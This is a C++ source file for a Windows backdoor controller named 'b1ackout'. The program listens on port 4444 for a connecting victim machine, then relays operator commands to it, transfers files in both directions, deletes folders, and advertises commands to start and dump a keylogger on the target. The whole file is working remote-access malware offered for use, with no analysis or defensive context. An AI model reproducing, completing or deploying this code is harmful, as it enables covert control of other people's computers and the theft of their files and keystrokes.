#include <WinSock2.h>
#include <iostream>
#include <fstream>
#include <string>

#define ZeroMemory RtlZeroMemory

#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable : 4996)
#pragma warning(disable : 4715)

using namespace std;

//---------------------
SOCKET s;
SOCKET newConnection;
//---------------------

//--------------------------
const char ip[] = "192.168.1.52";
const int port = 4444;
//--------------------------

//------Version---------
string version = "1.5";
//----------------------

class Backdoor {

public:

	void banner() {


		cout << endl;

		cout << "=============================================" << endl;

		cout << " ____  _            _     ___        _   " << "   |" << endl;

		cout << "| __ )/ | __ _  ___| | __/ _ \\ _   _| |_ " << "   |" << endl;

		cout << "|  _ \\| |/ _` |/ __| |/ / | | | | | | __|" << "   |" << endl;

		cout << "| |_) | | (_| | (__|   <| |_| | |_| | |_ " << "   |" << endl;

		cout << "|____/|_|\\__,_|\\___|_|\\_\\\\___/ \\__,_|\\__|" << "   |" << endl;

		cout << "\t\t\t\t\t " << version << "|\n=============================================" << endl;



		//commands

		printf("\ndownload <file>\t\t->\tDownload the file from target machine\n");

		printf("\nupload <file>\t\t->\tUpload the file to target machine\n");

		printf("\n!he\t\t\t->\tHelp\n");

		printf("\nrmdir /Q/S <foldername> ->\tTo delete this folder\n");

		printf("\nkeylog_start\t\t->\tStart the keylogger on target machine\n");

		printf("\nkeylog_dump\t\t->\tDump recorded keystrokes\n");

		cout << "\n";
	}

	int Preparation() {
		WSADATA wsaData;
		int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0) {
			printf("WsaStartup failed %d\n", iResult);
			return 1;
		}

		this->addr.sin_addr.s_addr = inet_addr(ip); 
		this->addr.sin_port = htons(port);	
		this->addr.sin_family = AF_INET;
		s = socket(AF_INET, SOCK_STREAM, NULL);
		int lnk_sizeof = sizeof(addr);
		bind(s, (SOCKADDR*)&addr, sizeof(addr));
		listen(s, SOMAXCONN);
		printf("[!] Listening on %s:%d\n", ip, port);	

		newConnection = accept(s, (SOCKADDR*)&addr, &lnk_sizeof);
		if (newConnection == 0 || newConnection == -1) {
			system("cls");
			cout << "[-] Error to accept the client\n";
			return 1;
		}

		else {

			banner();
			cout << "[+] Client connected\n" << endl;
			while (true) {

				ClientHandler();
			}
		}
	
		
	}


	void ClientHandler() {
		char msg[256] = {};

		cout << "\nb1ackout> ";
		cin.getline(msg, sizeof(msg));
		if (msg[0] == '!' && msg[1] == 'h' && msg[2] == 'e') banner();
		send(newConnection, msg, sizeof(msg), NULL);
		if (msg[0] == 'q' && msg[1] == NULL) {
			closesocket(newConnection);
			closesocket(s);
			exit(1);
		}
		string cmd_download = "abdasoad";
		for (int i = 0; i < 8; ++i) {
			cmd_download[i] = msg[i];
		}
		if (cmd_download == "download") {
			download(msg);
		}

		string cmd_upload = "ahyobx";
		for (int i = 0; i < 6; ++i) {
			cmd_upload[i] = msg[i];
		}
		if (cmd_upload == "upload") {			
			upload(msg);
		}

		//string cmd_keylogger; // .....

		if (msg[0] == 'e' && msg[1] == 'c' && msg[2] == 'h' && msg[3] == 'o' && msg[4] == ' ') {
			
			char msg[18];
			recv(newConnection, msg, sizeof(msg), NULL);
			cout << "\n" << msg << "\n" << endl;

		}

		else {

			cout << "\nClient$~: \n" << endl;
			while (true) {
				char result[8000] = {};
				recv(newConnection, result, sizeof(result), NULL);
				if (result[0] == 'e' && result[1] == 'x' && result[2] == NULL) break;
				cout << result;		
			}	
		}
	}

	void upload(const char* msg) {

		char word[256] = {}; // {} - obnylenie ctobi liwnee ne prilipalo k strokam
		int count = 0;
		// Find the name of file
		for (int i = 7; i < 256; ++i) {
			word[count] = msg[i];
			count++;

		}

		char format[3] = {};
		for (int i = 0; i < 256; ++i) {
			if (word[i] == '.') {
				format[0] = word[i + 1];
				format[1] = word[i + 2];
				format[2] = word[i + 3];
				break;
			}
		}
		if (format[0] == 't' && format[1] == 'x' && format[2] == 't') {
			
			ifstream in(word);

			while (in) {
				string str;
				getline(in, str);
				char msg[256] = {};
				msg[0] = '\n';
				for (int i = 1; i <= str.size(); ++i) {
					msg[i] = str[i - 1];
				}
				send(newConnection, msg, sizeof(msg), NULL);
			}
			char end[256] = "!stop";	// End of the file
			send(newConnection, end, sizeof(end), NULL);
		}

		if (format[0] == 'e' && format[1] == 'x' && format[2] == 'e') {
			streampos filesize = 0;
			cout << "AAA" << endl;
			ifstream in(word, ios::binary);
			char buffer[5000] = {};
			SecureZeroMemory(&buffer, sizeof(buffer));
			//getline(in, str); <--- Maybe it can help
			//char* msg = str;

			if (in.is_open())
			{
				while (1)
				{
					in.read(buffer, sizeof(buffer));
					if (in.eof())
					{
						cout << "End of File sending from Client" << endl;
						in.close();
						break;
					}
					else
					{
						send(newConnection, buffer, sizeof(buffer), 0);
						SecureZeroMemory(&buffer, sizeof(buffer));
					}
				}

				char end[5000] = "ex";	// End of the file
				send(newConnection, end, sizeof(end), NULL);
				exit(1);
			}
		}
		

		else {

			ifstream in(word, ios::binary);
			char buffer[5000] = {};
			int test = 0; // <--- TEST
			while (in.read(buffer, sizeof(buffer))) {
				send(newConnection, buffer, in.gcount(), NULL);
				cout << buffer << "\n=========================" << endl;
			}
			char end[5000] = "ex";	// End of the file
			send(newConnection, end, sizeof(end), NULL);
			
		}

		char response[24];
		recv(newConnection, response, sizeof(response), NULL);
		cout << endl << response << endl;
	}

	void download(const char* msg) {

		string cmd_download = "abdasoad";
		for (int i = 0; i < 8; ++i) {
			cmd_download[i] = msg[i];
		}

		int count = 0;
		char real_cmd[256] = {};

		for (int i = 9; i < 256; ++i) {
			real_cmd[count] = msg[i];
			count++;
		}
		
		char format[3] = {};

		for (int i = 0; i < 256; ++i) {
			if (real_cmd[i] == '.') {
				format[0] = real_cmd[i + 1];
				format[1] = real_cmd[i + 2];
				format[2] = real_cmd[i + 3];
				break;
			}
		}
		if (format[0] == 't' && format[1] == 'x' && format[2] == 't') {
			
			ofstream out(real_cmd);
			if (!out.is_open()) {
				cout << "ERROR #2";
				exit(1);
			}

			// Receiving the binary code and paste in file named real_cmd
			count = 0;

			while (count < 10000) {

				char res[256] = {};
				recv(newConnection, res, sizeof(res), NULL);
				
				if (res[0] == '!' && res[1] == 's' && res[2] == 't' && res[3] == 'o' && res[4] == 'p' && res[5] == NULL) break;
				
				//for(int i = 0;)
				
				out.write(res, sizeof(res));
				//out.write("\n", sizeof("\n"));
				count++;
			}

			out.close();
		}
		else {

			ofstream out(real_cmd, ios::binary);
			if (!out.is_open()) {
				cout << "ERROR #2";
				exit(1);
			}

			// Receiving the binary code and paste in file named real_cmd
			count = 0;
			char flag_stop[] = "tht";
			while (count < 10000) {

				char res[5000] = {};
				recv(newConnection, res, sizeof(res), NULL);


				if (res[0] == 'e' && res[1] == 'x' && res[2] == NULL) break;

				out.write(res, sizeof(res));
				count++;


			}

			out.close();
		}
	}

private:
	SOCKADDR_IN addr;

};

int main() {
	Backdoor a;
	a.Preparation();
	
	return 0;
}